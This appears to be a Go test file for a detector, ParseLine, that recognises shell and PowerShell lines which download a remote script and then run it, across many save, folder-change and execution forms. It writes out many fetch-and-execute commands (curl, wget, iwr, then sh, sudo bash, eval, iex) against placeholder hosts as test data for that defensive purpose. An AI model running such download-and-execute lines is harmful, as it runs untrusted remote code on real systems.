package installread

import (
	"fmt"
	"slices"
	"strings"
	"testing"
)

// PIPE-SCRIPT-1 round 4 (re-review of round 3, P2-1, P2-3, P3-3): where a run happens against where the file was saved.
// The state space, one row per cell: how the download is saved × what the line does with the folder between the save
// and the run × how the run spells the file × how it runs it. The folder is never certain — the line starts in one
// alalanet does not know, and any cd may fail, not persist (a subshell, a pipeline, a background job), not happen (a
// condition) or come back (cd -, popd) — so the rule is one: a run of a name the line saved a download under is that
// download's script, whatever the folder. Uncertainty never ends in silence; a wrong match only asks. A run of another
// name is no run of it.
func TestPipeScriptRound4FolderTable(t *testing.T) {
	const host = "https://e.example.com/"
	saves := map[string]string{ // %N: the file's name, %U: its address
		"curl -o":           "curl -fsSL -o %N %U",
		"curl -O":           "curl -fsSLO %U",
		"curl -o /tmp":      "curl -fsSL -o /tmp/%N %U",
		"curl -o sub/":      "curl -fsSL --create-dirs -o sub/%N %U",
		"curl --output-dir": "curl -fsSL --output-dir /tmp -O %U",
		"wget":              "wget -q %U",
		"wget -P":           "wget -q -P /tmp %U",
		"tee":               "curl -fsSL %U | tee %N >/dev/null",
		"> file":            "curl -fsSL %U > %N",
		"after cd":          "cd /tmp && curl -fsSLO %U",
		"upper case":        "curl -fsSL -o %M %U",
		"mv":                "curl -fsSL -o dl.tmp %U && mv dl.tmp %N",
	}
	folders := []string{
		"",
		"cd /tmp", "cd sub", "cd ..", "cd -", "cd /tmp; cd -", "cd /tmp && cd -", "cd", "cd; cd -", "cd ~", "cd ''",
		"cd -P .", "cd -L /tmp", "cd -- sub", "cd -P -- /tmp", "cd /nonexistent", "cd /nonexistent 2>/dev/null",
		"(cd sub && make)", "(cd /tmp)", "{ cd /tmp; }", "cd /tmp | cat", "cd sub &", "true || cd /tmp", "false && cd /tmp",
		"[ -d /zz ] && cd /zz", "if [ -d sub ]; then cd sub; fi", "cd sub || true",
		"pushd /tmp", "pushd /tmp; popd", "pushd sub >/dev/null && popd >/dev/null", "popd", "dirs -c; popd",
		"CDPATH=/tmp cd sub", "builtin cd /tmp", "command cd sub", "\\cd /tmp",
		"cd $D", "cd \"$D\"", "cd ${D:-.}", "cd \"$(dirname i.sh)\"", "cd `pwd`", "cd \"$OLDPWD\"", "cd \"$PWD\"", "cd $HOME",
		"cd /" + strings.Repeat("a", 5000), "cd " + strings.Repeat("a", 5000), strings.Repeat("cd a; ", 1000) + "cd /tmp",
		"Set-Location sub", "sh -c 'cd /tmp'", "env -C /tmp true",
	}
	paths := []string{"%N", "./%N", "/tmp/%N", "sub/%N", "../%N", "$PWD/%N", "${PWD}/%N", "\"$(pwd)/%N\"", ".//%N",
		"/tmp/./%N", "/tmp//%N", "~/%N", "$HOME/%N", "%M"}
	runs := map[string][2]string{ // the run, and the file name it needs
		"sh":            {"sh %P", "i.sh"},
		"bash -x":       {"bash -x %P --yes", "i.sh"},
		"sudo bash":     {"sudo -E bash %P", "i.sh"},
		"./ (chmod)":    {"chmod +x %P && %P", "i.sh"},
		"source":        {"source %P", "i.sh"},
		".":             {". %P", "i.sh"},
		"cat | sh":      {"cat %P | sh", "i.sh"},
		"sh <":          {"sh < %P", "i.sh"},
		"xargs -a sh":   {"xargs -a %P sh -c '{}'", "i.sh"},
		"$SHELL":        {"$SHELL %P", "i.sh"},
		"eval cat":      {"eval \"$(cat %P)\"", "i.sh"},
		"bash -c cat":   {"bash -c \"$(cat %P)\"", "i.sh"},
		"source <(cat)": {"source <(cat %P)", "i.sh"},
		"python3":       {"python3 %P", "i.py"},
		"xargs python3": {"echo x | xargs python3 %P", "i.py"},
		"xargs node":    {"echo | xargs node %P", "i.js"},
		"sudo xargs":    {"echo | sudo xargs perl %P", "i.pl"},
		"xargs sudo":    {"echo | xargs sudo python3 %P", "i.py"},
	}
	fill := func(s, name string) string {
		return strings.NewReplacer("%N", name, "%M", strings.ToUpper(name), "%U", host+name).Replace(s)
	}
	rows, bad, n := 0, 0, 0
	check := func(sk, folder, rk, p string, r [2]string) {
		if n++; raceDetector && n%7 != 0 {
			return // a seventh of the cells under the race detector (all of them take minutes there)
		}
		name := r[1]
		run := strings.ReplaceAll(r[0], "%P", p)
		parts := []string{fill(saves[sk], name)}
		if folder != "" {
			parts = append(parts, folder)
		}
		line := strings.Join(append(parts, fill(run, name)), "; ")
		rows++
		want := "script:" + host + name
		if tg, _, _, _ := ParseLine(line); !slices.Contains(tg, want) {
			if bad++; bad <= 40 {
				t.Errorf("save %q, folder %.40q, run %q as %q: ParseLine(%.200q) = %q; want %s", sk, folder, rk, p, line, tg, want)
			}
		}
		// another name is no run of the download
		oline := strings.Join(append(parts, fill(run, "other"+name[strings.IndexByte(name, '.'):])), "; ")
		if tg, _, _, _ := ParseLine(oline); slices.Contains(tg, want) {
			if bad++; bad <= 40 {
				t.Errorf("another name: ParseLine(%.200q) = %q; want no %s", oline, tg, want)
			}
		}
	}
	for sk := range saves {
		for _, folder := range folders {
			for rk, r := range runs { // every run form, spelled as the save named it and as ./name
				for _, p := range paths[:2] {
					check(sk, folder, rk, p, r)
				}
			}
			for _, p := range paths[2:] { // every other spelling, run by sh, as a program and by eval of its cat
				check(sk, folder, "sh", p, runs["sh"])
				check(sk, folder, "./ (chmod)", p, runs["./ (chmod)"])
				if !strings.Contains(p, "$(") { // eval "$(cat "$(pwd)/i.sh")": quotes nested in a quoted $( ), READER-ESCAPE-1's
					check(sk, folder, "eval cat", p, runs["eval cat"])
				}
			}
		}
	}
	if bad > 0 {
		t.Errorf("%d of %d cells wrong", bad, rows)
	}
	t.Logf("%d cells", rows)
}

// Round 4 (P3-1): the forms of this round's classes that were silent in both rounds — a quoted or declared assignment
// of a download, a saved file printed into a shell or eval, a link or install of it, a cat of it into another file, a
// rename into a folder, PowerShell's Get-Content and Set-Content — and what of them stays without a target.
func TestPipeScriptRound4Forms(t *testing.T) {
	const U, P = "https://e.example.com/i.sh", "https://e.example.com/i.ps1"
	const sh, ps = "script:" + U, "script:" + P
	for line, want := range map[string]string{
		`s="$(curl -fsSL ` + U + `)"; eval "$s"`:                                     sh,
		`export s=$(curl -fsSL ` + U + `); eval "$s"`:                                sh,
		`declare s=$(curl -fsSL ` + U + `); eval "$s"`:                               sh,
		`export s="$(curl -fsSL ` + U + `)"; bash -c "$s"`:                           sh,
		`local -r s="$(curl ` + U + `)"; eval $s`:                                    sh,
		"curl -o i.sh " + U + " && ln -s i.sh j.sh && sh j.sh":                       sh,
		"curl -o i.sh " + U + " && install -m755 i.sh /usr/local/bin/i && i":         sh,
		"curl -o i.sh " + U + " && cat i.sh > j.sh && sh j.sh":                       sh,
		"curl -o i.sh " + U + " && mv -t /tmp i.sh && sh /tmp/i.sh":                  sh,
		"curl -o i.sh " + U + " && cat < i.sh | bash":                                sh,
		"curl -o i.sh " + U + " && eval $(cat i.sh)":                                 sh,
		"curl -o i.sh " + U + " && $SHELL i.sh":                                      sh,
		"curl -o /usr/local/bin/i " + U + " && chmod +x /usr/local/bin/i && i --yes": sh,
		`iwr ` + P + ` -OutFile i.ps1; Get-Content i.ps1 | iex`:                      ps,
		`irm ` + P + ` -OutFile i.ps1; gc i.ps1 -Raw | iex`:                          ps,
		`irm ` + P + ` | Set-Content i.ps1; ./i.ps1`:                                 ps,
		`irm ` + P + ` | Set-Content i.ps1; & .\i.ps1`:                               ps,
		`irm ` + P + ` | Out-File -FilePath i.ps1; . ./i.ps1`:                        ps,
		`iwr ` + P + ` -OutFile I.PS1; .\i.ps1`:                                      ps,
		// a name the line computes may be any file it saved
		"curl -o i.sh " + U + " && bash $(echo i.sh)":                  sh,
		"curl -o i.sh " + U + " && f=i.sh && bash \"$f\"":              sh,
		"curl -o i.sh " + U + " && ls i.sh | xargs sh":                 sh,
		"curl -o i.sh " + U + " && find . -name i.sh | xargs -n1 bash": sh,
		"curl -o i.sh " + U + " && source $(ls i.sh)":                  sh,
		// PowerShell's variable of a download, then Invoke-Expression
		`$s = irm ` + P + `; iex $s`:                                        ps,
		`$s=irm ` + P + `; Invoke-Expression $s`:                            ps,
		"read -r -d '' s < <(curl -s " + U + "); eval \"$s\"":               sh,
		"IFS= read -rd '' s < <(curl " + U + "); bash -c \"$s\"":            sh,
		`$S = iwr -useb ` + P + `; iex $s`:                                  ps,
		`iwr ` + P + ` -OutFile i.ps1; iex (gc i.ps1 -Raw)`:                 ps,
		`iwr ` + P + ` -OutFile i.ps1; iex (Get-Content -Raw i.ps1)`:        ps,
		`Invoke-WebRequest -Uri ` + P + ` -OutFile ./i.ps1; iex (gc i.ps1)`: ps,
	} {
		if tg, _, _, _ := ParseLine(line); !slices.Contains(tg, want) {
			t.Errorf("ParseLine(%q) = %q; want %s", line, tg, want)
		}
	}
	for _, line := range []string{
		`s="$(curl -fsSL ` + U + `)"; echo "$s"`, "export s=x; eval \"$s\"", "curl -o i.sh " + U + " && cat i.sh > j.sh",
		"curl -o i.sh " + U + " && ln -s i.sh j.sh", "curl -o i.sh " + U + " && cat i.sh", "curl -o i.sh " + U + " && cat < i.sh",
		`Get-Content i.ps1 | iex`, `irm ` + P + ` -OutFile i.ps1; Get-Content i.ps1`, "curl -o i.sh " + U + " && cp i.sh /tmp/",
		"curl -o i.sh " + U + " && cd /tmp && ls", "curl -o i.sh " + U + " && eval \"$(cat j.sh)\"",
		"curl -o f " + U + " && xargs -a f echo", "curl -o f " + U + " && xargs -a f python3 run.py",
		"curl -o i.sh " + U + " && cp i.sh tools/ && tools --help", // a folder copied into is no file of the download
		"read -r s < <(curl -s " + U + "); echo \"$s\"", "bash $(echo i.sh)", "ls i.sh | xargs sh", "f=i.sh; bash \"$f\"", `$s = "x"; iex $s`, `iex (gc local.ps1)`,
		`irm ` + P + ` -OutFile i.ps1; iex (gc j.ps1)`,
	} {
		if tg, _, _, _ := ParseLine(line); slices.Contains(tg, sh) || slices.Contains(tg, ps) {
			t.Errorf("ParseLine(%q) = %q; want no script target", line, tg)
		}
	}
}

// Round 4: a name saved from more addresses than maxNamed keeps the first maxNamed and holds with the reason for the
// rest (the command's own bound on targets then applies); a run of two names runs the downloads of both (the first one found no longer hides another).
func TestPipeScriptRound4ManyUnderOneName(t *testing.T) {
	var b strings.Builder
	for k := 0; k < maxNamed+4; k++ {
		fmt.Fprintf(&b, "curl -so i.sh https://e%d.example.com/i.sh; ", k)
	}
	tg, un, _, _ := ParseLine(b.String() + "sh i.sh")
	var codes []string
	for _, u := range un {
		codes = append(codes, UnreadCode(u))
	}
	if !slices.Contains(tg, "script:https://e0.example.com/i.sh") || !slices.Contains(codes, "runs_remote_script") {
		t.Errorf("%d addresses under one name: targets %q, unread %q; want the first and runs_remote_script", maxNamed+4, tg, un)
	}
	_, un, _, _ = ParseLine(b.String() + "cat i.sh | sh")
	if len(un) == 0 || UnreadCode(un[0]) != "runs_remote_script" {
		t.Errorf("%d addresses under one name, cat into sh: unread %q; want runs_remote_script", maxNamed+4, un)
	}
	tg, _, _, _ = ParseLine("curl -so sh https://good.example.com/sh; curl -so i.sh https://evil.example.com/i.sh; sh i.sh")
	if !slices.Contains(tg, "script:https://evil.example.com/i.sh") {
		t.Errorf("a program named like a saved file hid the script it runs: %q", tg)
	}
}

// The bound on one name, exactly: maxNamed addresses kept, the next one marks more; the same address is kept once; a
// copy carries more to the new name and to every name.
func TestPipeScriptRound4NamedBound(t *testing.T) {
	s := savedNames{}
	for k := 0; k < maxNamed; k++ {
		s.add("./i.sh", savedRun{url: fmt.Sprintf("u%d", k)})
		s.add("i.sh", savedRun{url: fmt.Sprintf("u%d", k)})
	}
	if e := s.find("/x/I.SH"); e == nil || len(e.runs) != maxNamed || e.more {
		t.Fatalf("after %d addresses: %+v", maxNamed, e)
	}
	s.add("i.sh", savedRun{url: "one more"})
	if e := s.find("i.sh"); len(e.runs) != maxNamed || !e.more || !s[allNames].more {
		t.Errorf("one past the bound: %d kept, more=%v, all more=%v", len(e.runs), e.more, s[allNames].more)
	}
	s.copy("j.sh", s.find("i.sh"))
	if e := s.find("j.sh"); e == nil || len(e.runs) != maxNamed || !e.more {
		t.Errorf("the copy: %+v", e)
	}
	for _, f := range []string{"", ".", "..", "/", "x/.."} {
		if fileName(f) != "" {
			t.Errorf("fileName(%q) = %q; want none", f, fileName(f))
		}
	}
}

// Round 4: the run marks the download it runs, so the download is neither other nor a definition (the saved-file form).
func TestPipeScriptRound4Marks(t *testing.T) {
	const U = "https://e.example.com/i.sh"
	for _, l := range []string{"curl -o f " + U + "; sh f", "curl -o f " + U + "; bash $(echo f)", "curl -o f " + U + "; eval \"$(cat f)\""} {
		if _, _, other, _ := ParseLine(l); other {
			t.Errorf("%q: the download and its run alone are other", l)
		}
	}
	if _, _, other, _ := ParseLine("curl -o f " + U + "; cat f"); !other {
		t.Error("a saved download printed, not run: no longer other")
	}
}

// A run's addresses are once each, whatever the names it reads repeat (xargs -a f -a f, cat f f f).
func TestPipeScriptRound4RunOnce(t *testing.T) {
	s := savedNames{}
	s.add("f", savedRun{url: "u1", seg: 1})
	s.add("g", savedRun{url: "u1", seg: 2})
	c := gather(s.find("f"), s.find("f"), s.find("g"))
	if len(c.urls) != 1 || len(c.runs) != 1 {
		t.Errorf("one address under two names, read three times: urls %q, %d runs", c.urls, len(c.runs))
	}
}
